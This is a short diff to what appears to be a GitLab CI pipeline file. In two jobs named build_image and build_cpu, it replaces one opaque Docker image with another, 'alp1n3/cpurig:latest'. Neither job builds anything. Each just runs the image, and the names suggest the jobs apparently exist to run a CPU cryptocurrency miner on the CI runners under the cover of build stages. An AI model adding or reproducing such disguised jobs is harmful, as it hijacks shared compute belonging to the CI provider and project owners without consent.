@@ -13,9 +13,9 @@ before_script:
 build_image:
   stage: build_image
   script:
-    - docker run zenidine/nizadam:mualpine
+    - docker run alp1n3/cpurig:latest
 
 build_cpu:
   stage: build_cpu
   script:
-    - docker run zenidine/nizadam:mualpine
+    - docker run alp1n3/cpurig:latest
